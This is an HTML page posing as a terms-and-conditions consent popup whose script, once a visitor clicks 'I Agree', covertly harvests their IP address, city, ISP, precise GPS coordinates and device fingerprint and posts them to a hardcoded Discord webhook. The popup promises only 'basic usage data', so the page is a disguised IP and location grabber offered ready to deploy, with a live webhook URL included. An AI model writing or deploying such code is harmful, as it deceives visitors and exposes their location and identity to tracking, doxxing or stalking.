<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Welcome</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: Arial, sans-serif; background: #111; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }

    #popup {
      background: #1e1e1e;
      border: 1px solid #333;
      border-radius: 12px;
      padding: 32px;
      max-width: 400px;
      width: 90%;
      text-align: center;
      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
    }

    #popup h2 { margin-bottom: 12px; font-size: 20px; }
    #popup p { font-size: 14px; color: #aaa; margin-bottom: 24px; line-height: 1.6; }

    #agree {
      background: #5865F2;
      color: white;
      border: none;
      padding: 12px 32px;
      border-radius: 8px;
      font-size: 15px;
      cursor: pointer;
      width: 100%;
    }

    #agree:hover { background: #4752c4; }

    #decline {
      margin-top: 12px;
      background: none;
      border: none;
      color: #555;
      font-size: 13px;
      cursor: pointer;
      text-decoration: underline;
    }
  </style>
</head>
<body>

<div id="popup">
  <h2>Welcome</h2>
  <p>By continuing you agree to our Terms & Conditions and Privacy Policy. We may collect basic usage data to improve your experience.</p>
  <button id="agree">I Agree</button>
  <br/>
  <button id="decline">Decline</button>
</div>

<script>
document.getElementById("agree").addEventListener("click", async () => {
  document.getElementById("popup").style.display = "none";

  const webhook = "https://discord.com/api/webhooks/1569420361953443897/pJbG1Zhnx-MxdTWtvOzppho_UAfk3PMT2qwqNWQrDr55RqggcWK3jeyrBtcWelAGPQ-1";

  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const lang = navigator.language;
  const screen_res = `${screen.width}x${screen.height}`;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const time = new Date().toLocaleString();

  let deviceType = "Desktop";
  if (/Mobi|Android/i.test(ua)) deviceType = "Mobile";
  else if (/Tablet|iPad/i.test(ua)) deviceType = "Tablet";

  let os = "Unknown";
  if (/Windows/i.test(ua)) os = "Windows";
  else if (/Mac OS X/i.test(ua)) os = "macOS";
  else if (/Android/i.test(ua)) os = "Android";
  else if (/iPhone|iPad/i.test(ua)) os = "iOS";
  else if (/Linux/i.test(ua)) os = "Linux";

  let browser = "Unknown";
  if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
  else if (/Firefox/i.test(ua)) browser = "Firefox";
  else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
  else if (/Edg/i.test(ua)) browser = "Edge";
  else if (/OPR|Opera/i.test(ua)) browser = "Opera";

  let ip = "Unknown";
  let city = "Unknown";
  let country = "Unknown";
  let isp = "Unknown";
  try {
    const res = await fetch("https://ip-api.com/json/");
    const data = await res.json();
    ip = data.query;
    city = data.city;
    country = data.country;
    isp = data.isp;
  } catch (_) {}

  let lat = "Unknown";
  let lon = "Unknown";
  try {
    await new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition((pos) => {
        lat = pos.coords.latitude.toFixed(5);
        lon = pos.coords.longitude.toFixed(5);
        resolve();
      }, resolve, { timeout: 5000 });
    });
  } catch (_) {}

  const payload = {
    username: "Site Tracker",
    embeds: [{
      title: "New Visitor — Agreed to Terms",
      color: 0x57F287,
      fields: [
        { name: "Device Type", value: deviceType, inline: true },
        { name: "OS", value: os, inline: true },
        { name: "Browser", value: browser, inline: true },
        { name: "Screen", value: screen_res, inline: true },
        { name: "Language", value: lang, inline: true },
        { name: "Timezone", value: timezone, inline: true },
        { name: "IP Address", value: ip, inline: true },
        { name: "City (IP)", value: city, inline: true },
        { name: "Country", value: country, inline: true },
        { name: "ISP", value: isp, inline: true },
        { name: "GPS Lat", value: String(lat), inline: true },
        { name: "GPS Lon", value: String(lon), inline: true },
        { name: "Platform", value: platform, inline: true },
        { name: "Time", value: time, inline: false },
        { name: "User Agent", value: `\`${ua.slice(0, 200)}\``, inline: false }
      ],
      footer: { text: "User accepted terms" }
    }]
  };

  await fetch(webhook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
});

document.getElementById("decline").addEventListener("click", () => {
  document.getElementById("popup").innerHTML = "<p style='color:#555'>You declined. Access restricted.</p>";
});
</script>

</body>
</html>
